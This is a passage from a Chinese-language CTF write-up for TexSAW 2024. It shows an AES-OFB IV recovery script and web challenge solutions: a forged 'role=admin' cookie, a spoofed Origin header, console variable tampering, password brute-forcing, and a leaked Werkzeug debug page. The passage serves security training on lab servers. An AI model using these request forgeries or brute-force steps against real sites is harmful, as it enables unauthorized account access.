<p>nc 3.23.56.243 9013</p>
</blockquote>
<p>源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">one = <span class="string">&quot;----------------&quot;</span></span><br><span class="line">two = <span class="string">&quot;----------------&quot;</span></span><br><span class="line">maxlen = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message, key</span>):</span></span><br><span class="line">    aes = AES.new(key, AES.MODE_OFB, two)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">message, key</span>):</span></span><br><span class="line">    aes = AES.new(key, AES.MODE_OFB, two)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_ecb</span>(<span class="params">message, key</span>):</span></span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(message)</span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="string">&quot;Give me a message to encrypt:\n&quot;</span>)</span><br><span class="line">message = raw_input().strip()</span><br><span class="line"></span><br><span class="line">msglen = <span class="built_in">len</span>(message)</span><br><span class="line"><span class="keyword">if</span> msglen == <span class="number">0</span>:</span><br><span class="line">    sys.stdout.write(<span class="string">&quot;No message provided.\n&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    quit()</span><br><span class="line"><span class="keyword">elif</span> msglen &gt; maxlen:</span><br><span class="line">    message = message[:maxlen]</span><br><span class="line"><span class="keyword">elif</span> msglen % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    message += <span class="string">&quot;0&quot;</span> * (<span class="number">16</span> - msglen % <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">encrypted = encrypt(message, one)</span><br><span class="line">sys.stdout.write(<span class="string">&quot;Original Message:  &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(message))</span><br><span class="line">sys.stdout.write(<span class="string">&quot;Message in Hex:    &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(hexlify(message)))</span><br><span class="line">sys.stdout.write(<span class="string">&quot;Encrypted Message: &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(hexlify(encrypted)))</span><br><span class="line"></span><br><span class="line">sys.stdout.flush()</span><br><span class="line">quit()</span><br></pre></td></tr></table></figure>
<p>给定了一个密码系统，可以提供明文输入，获取密码输出，并且已知key，题目让求iv：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc 3.23.56.243 9013</span><br><span class="line">Give me a message to encrypt:</span><br><span class="line">cccccccccccccccc</span><br><span class="line">Encryption Key:    texsaw&#123;gl0ry_to_</span><br><span class="line">Original Message:  cccccccccccccccc</span><br><span class="line">Message <span class="keyword">in</span> Hex:    63636363636363636363636363636363</span><br><span class="line">Encrypted Message: 6895d0b539b5434d2e0a1b1e589e0981</span><br></pre></td></tr></table></figure>
<p>根据OFB解密流程，我们只需要将密文和明文异或，就可以得到key和iv的密码块了，只需要提供key就可以解出iv：</p>
<p><img src="https://s2.loli.net/2024/03/24/ZFhuzfS7jRVwAHc.png" alt="image-20240324232144392"></p>
<p>解密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_ecb</span>(<span class="params">message, key</span>):</span></span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;6895d0b539b5434d2e0a1b1e589e0981&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;63636363636363636363636363636363&#x27;</span></span><br><span class="line"></span><br><span class="line">c_int = <span class="built_in">int</span>(c, <span class="number">16</span>)</span><br><span class="line">m_int = <span class="built_in">int</span>(m, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">result_int = c_int ^ m_int</span><br><span class="line"></span><br><span class="line">result_hex = <span class="string">&#x27;&#123;:032x&#125;&#x27;</span>.<span class="built_in">format</span>(result_int)</span><br><span class="line">print(result_hex)</span><br><span class="line">print(result_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">print(decrypt_ecb(result_hex.decode(<span class="string">&#x27;hex&#x27;</span>), <span class="string">&quot;texsaw&#123;gl0ry_to_&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>得到flag后半部分：</p>
<p><img src="https://s2.loli.net/2024/03/24/NL1TKu2nwGSp8Ob.png" alt="image-20240324232251821"></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Login-Attempt"><a href="#Login-Attempt" class="headerlink" title="Login Attempt"></a>Login Attempt</h2><p>万能密码秒了</p>
<h2 id="Out-of-Bounds"><a href="#Out-of-Bounds" class="headerlink" title="Out of Bounds"></a>Out of Bounds</h2><blockquote>
<p>I really HATE game developers. So much  so that when I receive a new game, my priority is not to beat the game,  but to find out how to go to places I’m not supposed to. I made a cool  guide on several video games with out-of-bounds glitches which you can  find at <code>3.23.56.243:9004</code>. Do you have any additions to recommend??</p>
</blockquote>
<p>题目提示测试边界：</p>
<p><img src="https://s2.loli.net/2024/03/24/rJ1ZwWbo7MY8dkt.png" alt="image-20240324003450654"></p>
<p>路由界面输入-1就过了</p>
<p><img src="https://s2.loli.net/2024/03/24/ZiMJenPBwOCrH8I.png" alt="image-20240324003358008"></p>
<h2 id="Crazy-Cookie"><a href="#Crazy-Cookie" class="headerlink" title="Crazy Cookie"></a>Crazy Cookie</h2><blockquote>
<p>I can’t seem to login to the account to <code>3.23.56.243:9002</code>. Can you help me get access?</p>
</blockquote>
<p>抓包改cookie秒了</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>3.23.56.243:9002</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>role=admin</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
<h2 id="Extreme-Security"><a href="#Extreme-Security" class="headerlink" title="Extreme Security"></a>Extreme Security</h2><blockquote>
<p>We are at <code>3.23.56.243:9003</code> . We are so secure that we only allow requests from our own origin to access secret data.</p>
</blockquote>
<p>观察响应报文：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.2 Python/3.8.19</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sat, 23 Mar 2024 17:16:16 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>463</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://texsaw2024.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;link rel= &quot;stylesheet&quot; type= &quot;text/css&quot; href= &quot;/static/styles/home.css&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt; Login &lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body style=&quot;background-color:powderblue;&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;center-screen&quot;&gt;</span><br><span class="line">      &lt;h1&gt; Extremely Secure Co. &lt;/h1&gt;</span><br><span class="line">      &lt;p&gt; We are so secure that we only allow requests from our own origin to access secret data. Talk about some serious security! &lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>有个CORS检查，Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="https://texsaw2024.com">https://texsaw2024.com</a></p>
<p>加个Origin，发送报文：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>3.23.56.243:9003</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>texsaw2024.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://texsaw2024.com</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>role=user</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
<p>拿到flag：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.2 Python/3.8.19</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sat, 23 Mar 2024 17:15:14 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>364</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://texsaw2024.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;link rel= &quot;stylesheet&quot; type= &quot;text/css&quot; href= &quot;/static/styles/home.css&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt; Hello! &lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body style=&quot;background-color:powderblue;&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;center-screen&quot;&gt;</span><br><span class="line">      &lt;h1&gt; Super Secret Data: &lt;/h1&gt;</span><br><span class="line">      &lt;p&gt; texsaw&#123;s7t_y0ur_or7g7n&#125; &lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Over-9000"><a href="#Over-9000" class="headerlink" title="Over 9000"></a>Over 9000</h2><blockquote>
<p>Help Goku get over 9000 energy to defeat his enemy Vegeta and save the world.</p>
</blockquote>
<p>观察js文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> currentEnergy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gatheringEnergy</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    currentEnergy++;</span><br><span class="line">    $(<span class="string">&quot;#energycount&quot;</span>).html(<span class="string">`<span class="subst">$&#123;currentEnergy&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span>(currentEnergy == <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        alert(<span class="string">&quot;out of energy try again :(&quot;</span>)</span><br><span class="line">        currentEnergy = <span class="number">0</span>;</span><br><span class="line">        $(<span class="string">&quot;#energycount&quot;</span>).html(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (currentEnergy &gt; <span class="number">9000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            url:<span class="string">&quot;kamehameha.php&quot;</span>,</span><br><span class="line">            data:&#123;<span class="attr">energy</span>: currentEnergy&#125;,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">flag</span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">`<span class="subst">$&#123;flag&#125;</span>`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            error: <span class="function"><span class="keyword">function</span>(<span class="params">responseText,status, error</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`Tell the infrastructure team to fix this: Status = <span class="subst">$&#123;status&#125;</span> ; Error = <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有个currentEnergy变量控制点击次数</p>
<p>直接在控制台输入：currentEnergy=9001 </p>
<p><img src="https://s2.loli.net/2024/03/24/Qlhqr7HIBiVZCve.png" alt="image-20240324012035510"></p>
<h2 id="Insecure-Social-Media-Login"><a href="#Insecure-Social-Media-Login" class="headerlink" title="Insecure Social Media Login"></a>Insecure Social Media Login</h2><blockquote>
<p>Your friend John has forgotten his password and wants to enlist the help of his tech savy friend. This is where you come in.</p>
<p>You’re going to have to find a way to remember John’s password. The site is at <code>3.23.56.243:9007</code></p>
<p>This social media site looks insecure, like it probably doesn’t limit the number of guesses users can make…</p>
</blockquote>
<p>弱口令，上强度，大字典直接爆破，没啥意思</p>
<p><img src="https://s2.loli.net/2024/03/24/SHlK5YmANa1r3Oj.png" alt="image-20240324140028616"></p>
<h2 id="Ask-and-It-Shall-Be-Given-to-You"><a href="#Ask-and-It-Shall-Be-Given-to-You" class="headerlink" title="Ask, and It Shall Be Given to You"></a>Ask, and It Shall Be Given to You</h2><blockquote>
<p>The flag is at <code>3.23.56.243:9008</code>. Unfortunately it seems like the site is down right now :( . Maybe you  can ask someone for help? Don’t blow up their inbox though :) and make  sure you clearly tell them what you want.</p>
</blockquote>
<p>访问robots.txt有如下内容：</p>
<p><img src="https://s2.loli.net/2024/03/24/VQEdwx2IZT4UAic.png" alt="image-20240324014752993"></p>
<p>访问countdown路由：<a target="_blank" rel="noopener" href="http://3.23.56.243:9008/countdown">http://3.23.56.243:9008/countdown</a></p>
<p>尼玛，大半夜吓👴🏻一跳</p>
<p><img src="https://s2.loli.net/2024/03/24/i29NAcOfd1VarKL.png" alt="image-20240324014840535"></p>
<p>访问contactIT路由：</p>
<p><img src="https://s2.loli.net/2024/03/24/Pdm7WXCIkFzpARe.png" alt="image-20240324015157393"></p>
<p>提示post json数据：</p>
<p><img src="https://s2.loli.net/2024/03/24/NiM9L3ZleX1hoD2.png" alt="image-20240324015632183"></p>
<p>随便发发，通过debug信息大致可以看到要发emal和message（出题人老丈育了）两种消息，部分debug信息如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=en&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;TypeError: argument of type &amp;#39;NoneType&amp;#39; is not iterable</span><br><span class="line"> // Werkzeug Debugger&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;shortcut icon&quot;</span><br><span class="line">        href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      var CONSOLE_MODE = false,</span><br><span class="line">          EVALEX = true,</span><br><span class="line">          EVALEX_TRUSTED = false,</span><br><span class="line">          SECRET = &quot;WYleT8qx5TNo2HMQyp6Q&quot;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body style=&quot;background-color: #fff&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;debugger&quot;&gt;</span><br><span class="line">&lt;h1&gt;TypeError&lt;/h1&gt;</span><br><span class="line">&lt;div class=&quot;detail&quot;&gt;</span><br><span class="line">  &lt;p class=&quot;errormsg&quot;&gt;TypeError: argument of type &amp;#39;NoneType&amp;#39; is not iterable</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;h2 class=&quot;traceback&quot;&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;div class=&quot;traceback&quot;&gt;</span><br><span class="line">  &lt;h3&gt;&lt;/h3&gt;</span><br><span class="line">  &lt;ul&gt;&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-140079071313984&quot;&gt;</span><br><span class="line">  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;&lt;/cite&gt;,</span><br><span class="line">      line &lt;em class=&quot;line&quot;&gt;1488&lt;/em&gt;,</span><br><span class="line">      in &lt;code class=&quot;function&quot;&gt;__call__&lt;/code&gt;&lt;/h4&gt;</span><br><span class="line">  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;) -&amp;gt; cabc.Iterable[bytes]:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;The WSGI server calls the Flask application object as the&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;WSGI application. This calls :meth:`wsgi_app`, which can be&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;wrapped to apply middleware.&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.wsgi_app(environ, start_response)</span><br><span class="line">&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-140079071314128&quot;&gt;</span><br><span class="line">  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;&lt;/cite&gt;,</span><br><span class="line">      line &lt;em class=&quot;line&quot;&gt;1466&lt;/em&gt;,</span><br><span class="line">      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;</span><br><span class="line">  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)</span><br><span class="line">&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;           ^^^^^^^^^^^^^^^^^^^^^^^^&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;raise&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return response(environ, start_response)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;finally:&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-140079071314272&quot;&gt;</span><br><span class="line">  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;&lt;/cite&gt;,</span><br><span class="line">      line &lt;em class=&quot;line&quot;&gt;1463&lt;/em&gt;,</span><br><span class="line">      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;</span><br><span class="line">  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;ctx = self.request_context(environ)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error: BaseException | None = None&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()</span><br><span class="line">&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-140079071314416&quot;&gt;</span><br><span class="line">  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;&lt;/cite&gt;,</span><br><span class="line">      line &lt;em class=&quot;line&quot;&gt;872&lt;/em&gt;,</span><br><span class="line">      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;</span><br><span class="line">  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)</span><br><span class="line">&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self,&lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;rv: ft.ResponseReturnValue | HTTPException,&lt;/pre&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-140079071314560&quot;&gt;</span><br><span class="line">  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.12/site-packages/flask/app.py&quot;&lt;/cite&gt;,</span><br><span class="line">      line &lt;em class=&quot;line&quot;&gt;870&lt;/em&gt;,</span><br><span class="line">      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;</span><br><span class="line">  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;</span><br><span class="line">&lt;pre class=&quot;line 